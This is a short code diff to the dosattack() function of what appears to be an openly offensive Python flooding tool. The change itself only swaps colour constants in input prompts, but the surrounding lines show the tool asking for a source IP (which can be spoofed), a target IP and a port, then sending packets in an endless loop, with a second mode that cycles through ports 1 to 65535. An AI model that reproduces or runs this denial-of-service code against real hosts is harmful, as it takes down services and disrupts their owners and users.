@@ -102,9 +102,9 @@ def dosattack():
 	interface=str(input(RI+"[+]Enter Your Interface :"+RF))
 	choice=int(input(YI+"[1]Single Port \t [2]Multiple Port :"+YF))
 	if choice==1:
-		src_ip=input(YI+"[+]Enter IP address of Source: "+YP)
-		dst_ip=input(YI+"[+]Enter IP address of Target: "+YP)
-		sourceport = int(input(YI+"[+]Enter Source Port Number:"+YP))
+		src_ip=input(YI+"[+]Enter IP address of Source: "+YF)
+		dst_ip=input(YI+"[+]Enter IP address of Target: "+YF)
+		sourceport = int(input(YI+"[+]Enter Source Port Number:"+YF))
 		i = 1
 		while True:
 		   IP1 = IP(src= src_ip, dst=dst_ip)
@@ -114,9 +114,9 @@ def dosattack():
 		   print(YI+str(i)+YF+GI+"Packet Sent "+GF)
 		   i = i + 1
 	if choice==2:
-		src_ip=input(YI+"[+]Enter IP address of Source: "+YP)
-		dst_ip=input(YI+"[+]Enter IP address of Target: "+YP)
-		sourceport = int(input(YI+"[+]Enter Source Port Number:"+YP))
+		src_ip=input(YI+"[+]Enter IP address of Source: "+YF)
+		dst_ip=input(YI+"[+]Enter IP address of Target: "+YF)
+		sourceport = int(input(YI+"[+]Enter Source Port Number:"+YF))
 		i = 1
 		while True:
 			for x in range(1,65535):
